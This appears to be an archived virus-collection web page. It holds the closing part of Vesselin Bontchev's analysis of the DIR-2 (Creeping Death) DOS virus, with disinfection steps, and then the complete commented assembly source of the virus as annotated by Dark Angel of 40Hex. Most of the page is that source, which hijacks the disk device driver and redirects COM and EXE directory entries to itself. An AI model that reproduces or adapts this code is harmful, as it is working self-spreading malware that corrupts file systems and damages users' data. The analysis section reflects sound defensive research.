-IS- active in memory. Then copy all executable files to files with
non-executable extensions (i.e., COPY FILENAME.COM FILENAME.VIR). Then
delete all executable files, reboot from a clean disk and rename the
files back to their executable extensions. Instead copying, you can also
archive them. Especially the ARJ archiver is very convenient, since it
allows the creation of multi-volume archives. Just have in mind that the
virus will overwite the last cluster of the disk, so tell the archiver
not to use all of the diskette space for the archive (ARJ has such an
option). Afterwards, you should boot from a non-infected disk, delete
the executables, and then restore them from the archive.

In fact, an even easier disinfection method exists, and has been proposed
by the Polish anti-virus researcher Andrzej Kadlof. It consists of the
following steps:

1) Run an infected program, in order to make sure that the virus is active
in memory. This is mandatory.

2) For all directories of your disk(ette)(s) execute the following commands

        ren *.com *.coz
        ren *.exe *.exz

3) Reboot from a non-infected write-protected system diskette. You cannot
reboot from the hard disk, since the command interpretter has been renamed.

4) For all directories of your disk(ette)(s) execute the following commands

        ren *.coz *.com
        ren *.exz *.exe

5) Run CHKDSK/F on all disk(ette)(s) on which the above operation has been
performed. This is not mandatory, but it is useful to get rid of the lost
cluster(s), which contain the virus body. That's all, your system is
disinfected by now.

The appearance of this, completely new kind of virus, means that all the
current disinfecting programs have to be rewritten - maybe even
re-designed. Since the virus does not infect neither the boot sector,
nor the files, a new loop must be implemented in the disinfector, to
make to search the directory entries too.

Also, it is extremely important to identify this virus exactly (and to
distinguish between any possible future modifications), since if you
rely only on a virus signature, it is sufficient that someone releases
the virus with a slight modification of the directory entry encoding
algorithm, and your program will begin to destroy the files, instead of
disinfecting them. Of course, this is true for any virus, but
particularly this one is extremely easy to modify in order to fool
simple disifectors that do not perform exact identification.

The exact technical details how to write a disinfection program for this
virus are beyond the scope of this paper, but we have such program ready
in the Virus Test Center. If anybody observes the characteristic
symptoms of this virus, feel free to contact us, we'll do our best to
provide the nessecary help. Our address is:

        Virus Test Center
        University of Hamburg
        Fachbereich Informatik
        Vogt-Koeln-Strasse 34
        2000 Hamburg 54
        Germany

Phones: +49-40-54715-406 - Prof. Klaus Brunnstein
        +49-40-54715-225 - Simone Fisher-Huebner
        +49-40-54715-224 - Dipl. Eng. Vesselin Bontchev
        +49-40-54715-405 - Secretary
        +49-40-54715-246 - Fax

11. Conclusion

According to my reports, at least five more different mutations of this
virus are available in Bulgaria, but they are not as widespread.  One of
them is reported as being able to work under MS-DOS 5.0.  I expect that
this virus will become a large threat to the whole world before the end of
the year.  It is much more infective than Stoned and will still are unable
to stop the spreading of the latter.  Probably this virus will become to
the IBM PC world what WDEF has become for the MACs...

Dipl. Eng. Vesselin Bontchev
Virus Test Center, University of Hamburg
</pre>
<p><textarea cols=90 rows=30>

; Dark Angel's comments: I spent my entire waking hours looking at this virus.
;                        I love it.  It is my life.  I worship the drive it
;                        infects.  Take a look at it.  Let not my troubles be
;                        in vain.  Why did I do this?  I sacrifice my life for
;                        the benefit of 40Hex.  If you don't read this, I'm
;                        gonna go join [NuKE].

;        Creeping Death  V 1.0
;
;        (C) Copyright 1991 by VirusSoft Corp.

i13org    =    5f8h
i21org    =    5fch

dir_2   segment byte public
        assume  cs:dir_2, ds:dir_2

        org   100h

start:
         mov   sp,600h                          ; Set up the stack pointer
         inc   word ptr counter                 ; Generation counter
         xor   cx,cx
         mov   ds,cx                            ; DS points to interrupt table
         lds   ax, ds:[0c1h]                    ; Find interrupt 30h
         add   ax,21h                           ; Change it to Int 21h
         push  ds                               ; Save it on stack for use by
         push  ax                               ; subroutine "jump"
         mov   ah,30h                           ; Get DOS version
         call  jump
         cmp   al,4                             ; DOS 4.X+ : SI = 0
         sbb   si,si                            ; DOS 2/3  : SI = -1
         mov   byte ptr [drive+2],byte ptr -1   ; Initialise last drive to
                                                ; "never accessed"
         mov   bx,60h                           ; Adjust memory in ES to
         mov   ah,4ah                           ; BX paragraphs.
         call  jump

         mov   ah,52h                           ; Get DOS List of Lists
         call  jump                             ; to ES:BX
         push  es:[bx-2]                        ; Save Segment of first MCB
         lds   bx,es:[bx]                       ; DS:BX -> 1st DPB
                                                ;  (Drive parameter block)
search:  mov   ax,[bx+si+15h]                   ; Get segment of device driver
         cmp   ax,70h                           ; Is it CONFIG? (I think)
         jne   next                             ; If not, try again
         xchg  ax,cx                            ; Move driver segment to CX
         mov   [bx+si+18h],byte ptr -1          ; Flag block must be rebuilt
         mov   di,[bx+si+13h]                   ; Save offset of device driver
                                                ; Original device driver
                                                ; address in CX:DI
         mov   [bx+si+13h],offset header        ; Replace with our own
         mov   [bx+si+15h],cs                   ;  (header)
next:    lds   bx,[bx+si+19h]                   ; Get next device block
         cmp   bx,-1                            ; Is it the last one?
         jne   search                           ; If not, search it
         jcxz  install

         pop   ds                               ; Restore segment of first
         mov   ax,ds                            ; MCB
         add   ax,ds:[3]                        ; Go to next MCB
         inc   ax                               ; AX = segment next MCB
         mov   dx,cs                            ; DX = MCB owning current
         dec   dx                               ;      program
         cmp   ax,dx                            ; Are these the same?
         jne   no_boot                          ; If not, we are not currently
                                                ; in the middle of a reboot
         add   word ptr ds:[3],61h              ; Increase length owned by
                                                ; MCB by 1552 bytes
no_boot: mov   ds,dx                            ; DS = MCB owning current
                                                ; program
         mov   word ptr ds:[1],8                ; Set owner = DOS

         mov   ds,cx                            ; DS = segment of original
                                                ;      device driver
         les   ax,[di+6]                        ; ES = offset int handler
                                                ; AX = offset strategy entry
         mov   word ptr cs:str_block,ax         ; Save entry point
         mov   word ptr cs:int_block,es         ; And int block for use in
                                                ; function _in
         cld                                    ; Scan for the write
         mov   si,1                             ; function in the
scan:    dec   si                               ; original device driver
         lodsw
         cmp   ax,1effh
         jne   scan
         mov   ax,2cah                          ; Wicked un-yar place o'
         cmp   [si+4],ax                        ; doom.
         je    right
         cmp   [si+5],ax
         jne   scan
right:   lodsw
         push  cs
         pop   es
         mov   di,offset modify+1               ; Save address of patch
         stosw                                  ; area so it can be changed
         xchg  ax,si                            ; later.
         mov   di,offset i13org                 ; This is in the stack, but
         cli                                    ; it is used by "i13pr"
         movsw
         movsw

         mov   dx,0c000h                        ; Scan for hard disk ROM
                                                ; Start search @ segment C000h
fdsk1:   mov   ds,dx                            ; Load up the segment
         xor   si,si                            ; atart at offset 0000h
         lodsw                                  ; Scan for the signature
         cmp   ax,0aa55h                        ; Is it the signature?
         jne   fdsk4                            ; If not, change segment
         cbw                                    ; clear AH
         lodsb                                  ; load a byte to AL
         mov   cl,9
         sal   ax,cl                            ; Shift left, 0 filled
fdsk2:   cmp   [si],6c7h
         jne   fdsk3
         cmp   word ptr [si+2],4ch
         jne   fdsk3
         push  dx                               ; Save the segment
         push  [si+4]                           ; and offset on stack
         jmp   short death                      ; for use by i13pr

install: int   20h
file:    db    "c:",255,0
fdsk3:   inc   si                               ; Increment search offset
         cmp   si,ax                            ; If we are not too high,
         jb    fdsk2                            ; try again
fdsk4:   inc   dx                               ; Increment search segment
         cmp   dh,0f0h                          ; If we are not in high
         jb    fdsk1                            ; memory, try again

         sub   sp,4                             ; effectively push dummy vars.
death:   push  cs                               ; on stack for use by i13pr
         pop   ds
         mov   bx,ds:[2ch]                      ; Get environment from PSP
         mov   es,bx
         mov   ah,49h                           ; Release it (to save memory)
         call  jump
         xor   ax,ax
         test  bx,bx                            ; Is BX = 0?
         jz    boot                             ; If so, we are booting now
         mov   di,1                             ; and not running a file
seek:    dec   di                               ; Search for end of
         scasw                                  ; the environment block
         jne   seek
         lea   si,[di+2]                        ; SI points to filename
         jmp   short exec                       ; (in DOS 3.X+)
                                                ; Execute that file
boot:    mov   es,ds:[16h]                      ; get PSP of parent
         mov   bx,es:[16h]                      ; get PSP of parent
         dec   bx                               ; go to its MCB
         xor   si,si
exec:    push  bx
         mov   bx,offset param                  ; Set up parameter block
                                                ; for EXEC function
         mov   [bx+4],cs                        ; segment to command line
         mov   [bx+8],cs                        ; segment to 1st FCB
         mov   [bx+12],cs                       ; segment to 2nd FCB
         pop   ds
         push  cs
         pop   es

         mov   di,offset f_name
         push  di                               ; Save filename offset
         mov   cx,40                            ; Copy the filename to
         rep   movsw                            ; the buffer
         push  cs
         pop   ds

         mov   ah,3dh                           ; Handle open file
         mov   dx,offset file                   ; "c:ÿ",0
         call  jump
         pop   dx                               ; DS:DX -> filename

         mov   ax,4b00h                         ; Load and Execute
         call  jump                             ; ES:BX = param block
         mov   ah,4dh                           ; Get errorlevel
         call  jump
         mov   ah,4ch                           ; Terminate

jump:    pushf                                  ; Simulate an interrupt 21h
         call  dword ptr cs:[i21org]
         ret


;--------Installation complete

i13pr:   mov   ah,3                             ; Write AL sectors from ES:BX
         jmp   dword ptr cs:[i13org]            ; to track CH, sector CL,
                                                ; head DH, drive DL


main:    push  ax            ; driver
         push  cx            ; strategy block
         push  dx
         push  ds
         push  si
         push  di

         push  es                               ; Move segment of parameter
         pop   ds                               ; block to DS
         mov   al,[bx+2]                        ; [bx+2] holds command code

         cmp   al,4                             ; Input (read)
         je    input
         cmp   al,8                             ; Output (write)
         je    output
         cmp   al,9                             ; Output (write) with verify
         je    output

         call  in_                              ; Call original device
         cmp   al,2                             ; Request build BPB
         jne   ppp                              ; If none of the above, exit
         lds   si,[bx+12h]                      ; DS:SI point to BPB table
         mov   di,offset bpb_buf                ; Replace old pointer with
         mov   es:[bx+12h],di                   ; a pointer to our own
         mov   es:[bx+14h],cs                   ; BPB table
         push  es                               ; Save segment of parameters
         push  cs
         pop   es
         mov   cx,16                            ; Copy the old BPB table to
         rep   movsw                            ; our own
         pop   es                               ; Restore parameter segment
         push  cs
         pop   ds
         mov   al,[di+2-32]                     ; AL = sectors per allocation
         cmp   al,2                             ;      unit.  If less than
         adc   al,0                             ;      2, increment
         cbw                                    ; Extend sign to AH (clear AH)
         cmp   word ptr [di+8-32],0             ; Is total number sectors = 0?
         je    m32                              ; If so, big partition (>32MB)
         sub   [di+8-32],ax                     ; Decrease space of disk by
                                                ; one allocation unit(cluster)
         jmp   short ppp                        ; Exit
m32:     sub   [di+15h-32],ax                   ; Handle large partitions
         sbb   word ptr [di+17h-32],0

ppp:     pop   di
         pop   si
         pop   ds
         pop   dx
         pop   cx
         pop   ax
rts:     retf                                   ; We are outta here!

output:  mov   cx,0ff09h
         call  check                            ; is it a new disk?
         jz    inf_sec                          ; If not, go away
         call  in_                              ; Call original device handler
         jmp   short inf_dsk

inf_sec: jmp   _inf_sec
read:    jmp   _read
read_:   add   sp,16                            ; Restore the stack
         jmp   short ppp                        ; Leave device driver

input:   call  check                            ; Is it a new disk?
         jz    read                             ; If not, leave
inf_dsk: mov   byte ptr [bx+2],4                ; Set command code to READ
         cld
         lea   si,[bx+0eh]                      ; Load from buffer address
         mov   cx,8                             ; Save device driver request
save:    lodsw                                  ; on the stack
         push  ax
         loop  save
         mov   word ptr [bx+14h],1              ; Starting sector number = 1
                                                ; (Read 1st FAT)
         call  driver                           ; Read one sector
         jnz   read_                            ; If error, exit
         mov   byte ptr [bx+2],2                ; Otherwise build BPB
         call  in_                              ; Have original driver do the
                                                ; work
         lds   si,[bx+12h]                      ; DS:SI points to BPB table
         mov   ax,[si+6]                        ; Number root directory entries
         add   ax,15                            ; Round up
         mov   cl,4
         shr   ax,cl                            ; Divide by 16 to find sectors
                                                ; of root directory
         mov   di,[si+0bh]                      ; DI = sectors/FAT
         add   di,di                            ; Double for 2 FATs
         stc                                    ; Add one for boot record
         adc   di,ax                            ; Add sector size of root dir
         push  di                               ; to find starting sector of
                                                ; data (and read)
         cwd                                    ; Clear DX
         mov   ax,[si+8]                        ; AX = total sectors
         test  ax,ax                            ; If it is zero, then we have
         jnz   more                             ; an extended partition(>32MB)
         mov   ax,[si+15h]                      ; Load DX:AX with total number
         mov   dx,[si+17h]                      ; of sectors
more:    xor   cx,cx
         sub   ax,di                            ; Calculate FAT entry for last
                                                ; sector of disk
         sbb   dx,cx
         mov   cl,[si+2]                        ; CL = sectors/cluster
         div   cx                               ; AX = cluster #
         cmp   cl,2                             ; If there is more than 1
         sbb   ax,-1                            ; cluster/sector, add one
         push  ax                               ; Save cluster number
         call  convert                          ; AX = sector number to read
                                                ; DX = offset in sector AX
                                                ;      of FAT entry
                                                ; DI = mask for EOF marker
         mov   byte ptr es:[bx+2],4             ; INPUT (read)
         mov   es:[bx+14h],ax                   ; Starting sector = AX
         call  driver                           ; One sector only
again:   lds   si,es:[bx+0eh]                   ; DS:SI = buffer address
         add   si,dx                            ; Go to FAT entry
         sub   dh,cl                            ; Calculate a new encryption
         adc   dx,ax                            ; value
         mov   word ptr cs:gad+1,dx             ; Change the encryption value
         cmp   cl,1                             ; If there is 0 cluster/sector
         je    small_                           ; then jump to "small_"
         mov   ax,[si]                          ; Load AX with offset of FAT
                                                ; entry
         and   ax,di                            ; Mask it with value from
                                                ; "convert" then test to see
                                                ; if the sector is fine
         cmp   ax,0fff7h                        ; 16 bit reserved/bad
         je    bad
         cmp   ax,0ff7h                         ; 12 bit reserved/bad
         je    bad
         cmp   ax,0ff70h                        ; 12 bit reserved/bad
         jne   ok
bad:     pop   ax                               ; Tried to replicate on a bad
         dec   ax                               ; cluster.  Try again on a
         push  ax                               ; lower one.
         call  convert                          ; Find where it is in the FAT
         jmp   short again                      ; and try once more
small_:  not   di                               ; Reverse mask bits
         and   [si],di                          ; Clear other bits
         pop   ax                               ; AX = cluster number
         push  ax
         inc   ax                               ; Need to do 2 consecutive
         push  ax                               ; bytes
         mov   dx,0fh
         test  di,dx
         jz    here
         inc   dx                               ; Multiply by 16
         mul   dx
here:    or    [si],ax                          ; Set cluster to next
         pop   ax                               ; Restore cluster of write
         call  convert                          ; Calculate buffer offset
         mov   si,es:[bx+0eh]                   ; Go to FAT entry (in buffer)
         add   si,dx
         mov   ax,[si]
         and   ax,di
ok:      mov   dx,di                            ; DI = mask from "convert"
         dec   dx
         and   dx,di                            ; Yerg!
         not   di
         and   [si],di
         or    [si],dx                          ; Set [si] to DI

         cmp   ax,dx                            ; Did we change the FAT?
         pop   ax                               ; i.e. Are we already on this
         pop   di                               ; disk?
         mov   word ptr cs:pointer+1,ax         ; Our own starting cluster
         je    _read_                           ; If we didn't infect, then
                                                ; leave the routine.  Oh
                                                ; welp-o.
         mov   dx,[si]
         push  ds
         push  si
         call  write                            ; Update the FAT
         pop   si
         pop   ds
         jnz   _read_                           ; Quit if there's an error
         call  driver
         cmp   [si],dx
         jne   _read_
         dec   ax
         dec   ax
         mul   cx                               ; Multiply by sectors/cluster
                                                ; to find the sector of the
                                                ; write
         add   ax,di
         adc   dx,0
         push  es
         pop   ds
         mov   word ptr [bx+12h],2              ; Byte/sector count
         mov   [bx+14h],ax                      ; Starting sector #
         test  dx,dx
         jz    less
         mov   word ptr [bx+14h],-1             ; Flag extended partition
         mov   [bx+1ah],ax                      ; Handle the sector of the
         mov   [bx+1ch],dx                      ; extended partition
less:    mov   [bx+10h],cs                      ; Transfer address segment
         mov   [bx+0eh],100h                    ; and the offset (duh)
         call  write                            ; Zopy ourselves!
                                                ; (We want to travel)
_read_:  std
         lea   di,[bx+1ch]                      ; Restore device driver header
         mov   cx,8                             ; from the stack
load:    pop   ax
         stosw
         loop  load
_read:   call  in_                              ; Call original device handler

         mov   cx,9
_inf_sec:
         mov   di,es:[bx+12h]                   ; Bytes/Sector
         lds   si,es:[bx+0eh]                   ; DS:SI = pointer to buffer
         sal   di,cl                            ; Multiply by 512
                                                ; DI = byte count
         xor   cl,cl
         add   di,si                            ; Go to address in the buffer
         xor   dl,dl                            ; Flag for an infection in
                                                ; function find
         push  ds
         push  si
         call  find                             ; Infect the directory
         jcxz  no_inf
         call  write                            ; Write it back to the disk
         and   es:[bx+4],byte ptr 07fh          ; Clear error bit in status
                                                ; word
no_inf:  pop   si
         pop   ds
         inc   dx                               ; Flag for a decryption in
                                                ; function find
         call  find                             ; Return right information to
                                                ; calling program
         jmp   ppp

;--------Subroutines

find:    mov   ax,[si+8]                        ; Check filename extension
         cmp   ax,"XE"                          ; in directory structure
         jne   com
         cmp   [si+10],al
         je    found
com:     cmp   ax,"OC"
         jne   go_on
         cmp   byte ptr [si+10],"M"
         jne   go_on
found:   test  [si+1eh],0ffc0h ; >4MB           ; Check file size high word
         jnz   go_on                            ; to see if it is too big
         test  [si+1dh],03ff8h ; <2048B         ; Check file size low word
         jz    go_on                            ; to see if it is too small
         test  [si+0bh],byte ptr 1ch            ; Check attribute for subdir,
         jnz   go_on                            ; volume label or system file
         test  dl,dl                            ; If none of these, check DX
         jnz   rest                             ; If not 0, decrypt
pointer: mov   ax,1234h                         ; mov ax, XX modified elsewhere
         cmp   ax,[si+1ah]                      ; Check for same starting
                                                ; cluster number as us
         je    go_on                            ; If it is, then try another
         xchg  ax,[si+1ah]                      ; Otherwise make it point to
                                                ; us.
gad:     xor   ax,1234h                         ; Encrypt their starting
                                                ; cluster
         mov   [si+14h],ax                      ; And put it in area reserved
                                                ; by DOS for no purpose
         loop  go_on                            ; Try another file
rest:    xor   ax,ax                            ; Disinfect the file
         xchg  ax,[si+14h]                      ; Get starting cluster
         xor   ax,word ptr cs:gad+1             ; Decrypt the starting cluster
         mov   [si+1ah],ax                      ; and put it back
go_on:   db    2eh,0d1h,6                       ; rol cs:[gad+1], 1
         dw    offset gad+1                     ; Change encryption and
         add   si,32                            ; go to next file
         cmp   di,si                            ; If it is not past the end of
         jne   find                             ; the buffer, then try again
         ret                                    ; Otherwise quit

check:   mov   ah,[bx+1]                        ; ah = unit code (block device
                                                ;                 only)
drive:   cmp   ah,-1                            ; cmp ah, XX can change.
                                                ; Compare with the last call
                                                ; -1 is just a dummy
                                                ; impossible value that will
                                                ; force the change to be true
         mov   byte ptr cs:[drive+2],ah         ; Save this call's drive
         jne   changed                          ; If not the same as last call
                                                ; media has changed
         push  [bx+0eh]                         ; If it is the same physical
                                                ; drive, see if floppy has
                                                ; been changed
         mov   byte ptr [bx+2],1                ; Tell original driver to do a
         call  in_                              ; media check (block only)
         cmp   byte ptr [bx+0eh],1              ; Returns 1 in [bx+0eh] if
         pop   [bx+0eh]                         ; media has not been changed
         mov   [bx+2],al                        ; Restore command code
changed: ret                                    ; CF,ZF set if media has not
                                                ; been changed, not set if
                                                ; has been changed or we don't
                                                ; know
write:   cmp   byte ptr es:[bx+2],8             ; If we want OUTPUT, go to
         jae   in_                              ; original device handler
                                                ; and return to caller
         mov   byte ptr es:[bx+2],4             ; Otherwise, request INPUT
         mov   si,70h
         mov   ds,si                            ; DS = our segment
modify:  mov   si,1234h                         ; Address is changed elsewhere
         push  [si]
         push  [si+2]
         mov   [si],offset i13pr
         mov   [si+2],cs
         call  in_                              ; Call original device handler
         pop   [si+2]
         pop   [si]
         ret

driver:  mov   word ptr es:[bx+12h],1           ; One sector
in_:                                            ; in_ first calls the strategy
                                                ; of the original device
                                                ; driver and then calls the
                                                ; interrupt handler
         db    09ah                             ; CALL FAR PTR
str_block:
         dw    ?,70h                            ; address
         db    09ah                             ; CALL FAR PTR
int_block:
         dw    ?,70h                            ; address
         test  es:[bx+4],byte ptr 80h           ; Was there an error?
         ret

convert: cmp   ax,0ff0h                         ; 0FFF0h if 12 bit FAT
         jae   fat_16                           ; 0FF0h = reserved cluster
         mov   si,3                             ; 12 bit FAT
         xor   word ptr cs:[si+gad-1],si        ; Change the encryption value
         mul   si                               ; Multiply by 3 and
         shr   ax,1                             ; divide by 2
         mov   di,0fffh                         ; Mark it EOF (low 12 bits)
         jnc   cont                             ; if it is even, continue
         mov   di,0fff0h                        ; otherwise, mark it EOF (high
         jmp   short cont                       ; 12 bits) and then continue
fat_16:  mov   si,2                             ; 16 bit FAT
         mul   si                               ; Double cluster #
         mov   di,0ffffh                        ; Mark it as end of file
cont:    mov   si,512
         div   si                               ; AX = sector number
                                                ; (relative to start of FAT)
                                                ; DX = offset in sector AX
header:  inc   ax                               ; Increment AX to account for
         ret                                    ; boot record

counter: dw    0

         dw    842h                             ; Attribute
                                                ;  Block device
                                                ;  DOS 3 OPEN/CLOSE removable
                                                ;        media calls supported
                                                ;  Generic IOCTL call supported
                                                ; Supports 32 bit sectors
         dw    offset main                      ; Strategy routine
         dw    offset rts                       ; Interrupt routine (rtf)
         db    7fh                              ; Number of subunits supported
                                                ; by this driver.  Wow, lookit
                                                ; it -- it's so large and juicy

; Parameter block format:
; 0  WORD Segment of environment
; 2 DWORD pointer to command line
; 6 DWORD pointer to 1st default FCB
;10 DWORD pointer to 2nd default FCB
param:   dw    0,80h,?,5ch,?,6ch,?

bpb_buf: db    32 dup(?)
f_name:  db    80 dup(?)

;--------The End.
dir_2   ends
        end     start

</textarea></td></tr></table></body></html>
